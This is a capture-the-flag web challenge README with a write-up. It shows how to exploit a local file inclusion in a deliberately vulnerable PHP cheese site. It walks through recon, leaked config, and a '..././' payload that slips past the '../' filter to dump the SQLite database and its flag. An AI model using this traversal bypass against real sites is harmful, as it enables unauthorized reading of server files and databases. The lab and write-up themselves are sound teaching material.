# cheese-factory 🧀 🏭

> web

Author: [lilc4t](https://github.com/masterT)

We make good cheeses, some smell, some don't, in all cases they're good.

http://localhost:12080/


## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

### Recon

Visit the website and inspect the page and them source code.

It looks like it includes _php_ file. This means that we might be able to exploit a  [LFI](https://en.wikipedia.org/wiki/File_inclusion_vulnerability) (local file inclusion).

```
/?page=home.php
/?page=about.php
/?page=contact.php
```

Also after each "cheese" HTML block there is the comment `<!-- secret: 0 -->`. There might be a _secret_ cheese or something like that.

Let's check if there is a `/robots.txt`. Yes there is one.

```
User-agent: *
Disallow: /README.md
Disallow: /LICENSE
```

Visit `/README.md`.

```md
# The Cheese Factory

Very easy to setup the website. The cheeses are stored in an SQLite database.

## Requirements

- PHP

## Config

The entry point of the website is `./index.php`.

Modify config values in `./application/config/config.php`.

- error reporting level
- database path
- pages
- default page
- security
- etc.


### Current config recap

<!-- Too lazy to write proper sentences, just pasted the current config -->

$config = array();

// Environment
// $config['environment'] = 'production';
$config['environment'] = 'development';

// Security
$config['secure'] = true;

// Error reporting.
if ($config['environment'] === 'production') {
	ini_set('display_errors', 0);
	error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
}


// Database.
$config['database-path'] = dirname(__FILE__) . '/../database/the-cheese-factory.db';
$config['db'] = new SQLite3($config['database-path']);

// Pages
$config['pages'] = array('home.php', 'about.php', 'contact.php');
$config['default-page'] = $config['pages'][0];
```

There is a lot of information here.

First it gives the location of some sensible files:

- entry `index.php`
- config `application/config/config.php`
- database `application/database/the-cheese-factory.db`

We also know there is `$config['secure']` enabled.

Finally the error reporting is not disabled.

Let's finish our recon and visit `/LICENSE`.

```
No LICENSE
```

Ok nothing interesting here.


### Exploitation

Now it's time to try exploit the possible LFI.

Let's try to break the `page` system and display an error message.

http://localhost:12080/?page=foobar

```
<!-- ... -->
Warning: include(./application/views/foobar): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/foobar' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
```

It looks like it tries to [include](http://php.net/manual/en/function.include.php) the file given by the param `page` in the directory `application/views`.

Let's try to include the `LICENSE` file.

http://localhost:12080/?page=../../LICENSE

```
<!-- ... -->
Warning: include(./application/views/LICENSE): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/LICENSE' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
```

what the heck? It looks like it striped the `../../`.

Let's try with specifying the current directory.

http://localhost:12080/?page=./../../LICENSE

```
<!-- ... -->
Warning: include(./application/views/./LICENSE): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/./LICENSE' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
```

It looks like it only stripped the `../` from the `page` param.

Let's try to isolate the behaviour.

http://localhost:12080/?page=foo/../bar

```
<!-- ... -->
Warning: include(./application/views/foo/bar): failed to open stream: No such file or directory in /var/www/html/index.php on line 73

Warning: include(): Failed opening './application/views/foo/bar' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 73
<!-- ... -->
```

Ok it seem to only replace the `../`.

It we want to bypass this system we need to create a `page` params that we equals to `../../LICENSE` after we would remove all `../` from it.

To do it we can insert `../` between each `../`.

1. `../../LICENSE`
2. `..././../LICENSE` (insert `../` at index 1)
3. `..././..././LICENSE` (insert `../` at index 7)

http://localhost:12080/?page=..././..././LICENSE


```
<!-- ... -->
No LICENSE
<!-- ... -->
```

Yeah!

Now let's read the content of the database.

http://localhost:12080/?page=..././..././application/database/the-cheese-factory.db

```
<!-- ... --->
SQLite format 3@  .Y
����P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�A�YtablecheesescheesesCREATE TABLE cheeses (
id INTEGER PRIMARY KEY AUTOINCREMENT,
name TEXT NOT NULL UNIQUE,
description TEXT NOT NULL,
image TEXT NOT NULL,
secret TINYINT NOT NULL
)-Aindexsqlite_autoindex_cheeses_1cheeses

9�
�t
9�d'�U�c	Secret CheeseThe most delicious cheese. Made with the secret ingredient CFI{local_file_inclusion_tastes_so_good}.https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Red_flag_waving.svg/249px-Red_flag_waving.svg.png�Q�7�kGoudaGouda is a mild, yellow cheese made from cow's milk. It is one of the most popular cheeses worldwide. The name is used today as a general term for numerous similar cheeses produced in the traditional Dutch manner.https://upload.wikimedia.org/wikipedia/commons/thumb/f/fb/Smoked_gouda_cheese.jpg/800px-Smoked_gouda_cheese.jpg�:!�C�'MozzarellaMozzarella is a traditionally southern Italian cheese made from Italian buffalo's milk by the pasta filata method. Mozzarella received a Traditional Specialities Guaranteed certification from the European Union in 1998.https://upload.wikimedia.org/wikipedia/commons/5/57/Mozzarella_di_bufala3.jpg�|�G�)CamembertCamembert is a moist, soft, creamy, surface-ripened cow's milk cheese. It was first made in the late 18th century at Camembert, Normandy, in northern France.https://upload.wikimedia.org/wikipedia/commons/4/4d/Camembert_%28Cheese%29.jpg�M�U�=RoquefortRoquefort is a sheep milk cheese from the south of France, and together with Bleu d'Auvergne, Stilton, and Gorgonzola is one of the world's best known blue cheeses.https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Wikicheese_-_Roquefort_-_20150417_-_003.jpg/1920px-Wikicheese_-_Roquefort_-_20150417_-_003.jpg
������'Secret Cheese	Gouda!Mozzarella
Camembert	Roquefort
��cheeses
<!-- ... --->
```

Even if we can't recreate the database from this, the content is still readable.

```
CFI{local_file_inclusion_tastes_so_good}
```

🚩
